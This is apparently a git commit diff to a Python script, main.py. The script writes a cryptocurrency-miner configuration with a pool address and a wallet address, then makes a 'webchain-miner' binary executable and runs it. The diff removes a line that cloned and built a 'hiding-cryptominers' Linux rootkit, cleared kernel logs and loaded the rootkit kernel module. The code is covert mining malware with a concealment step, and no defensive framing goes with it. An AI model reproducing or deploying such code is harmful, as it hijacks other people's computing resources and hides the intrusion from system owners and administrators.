1e363a5de0ec59ce6c060f05b473ef449c42ffec
drakibaidb9 <132120897+drakibaidb9@users.noreply.github.com>
2023-05-02 12:27:23 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,3 +1,45 @@
 import os
-os.system('git clone https://github.com/drakibaidb9/hiding-cryptominers-linux-rootkit && cd hiding-cryptominers-linux-rootkit/ && make && dmesg -C && insmod rootkit.ko && cd ..')
+import json
+import requests
+
+name = requests.get("https://names.drycodes.com/1")
+print(name.text.replace("[","").replace("]","").replace('"',""))
+# Data to be written
+worker_id= name.text.replace("[","").replace("]","").replace('"',"")
+dictionary = {                                                                                                             
+    "av": 0,                
+    "background": False,    
+    "colors": True,         
+      
+    "donate-level": 1,      
+           
+    "max-cpu-usage": 50,    
+    "print-time": 60,       
+    "retries": 5,           
+    "retry-pause": 5,       
+    "safe": False,          
+    "syslog": False,        
+           
+    "pools": [
+        {
+            "url": "pool.webchain.network:2222", 
+            "user": "0x099C7845803e2aBa1182889A1cCB7d7Cb2143005",               
+            "pass": "x",                         
+            "worker-id": worker_id,                    
+            "keepalive": False,                  
+            "nicehash": False
+        }
+    ],
+    "api": {
+        "port": 0,                             
+                            
+    }
+}
+ 
+# Serializing json
+json_object = json.dumps(dictionary, indent=4)
+ 
+# Writing to sample.json
+with open("config.json", "w") as outfile:
+    outfile.write(json_object)
 os.system('chmod +x webchain-miner && ./webchain-miner')
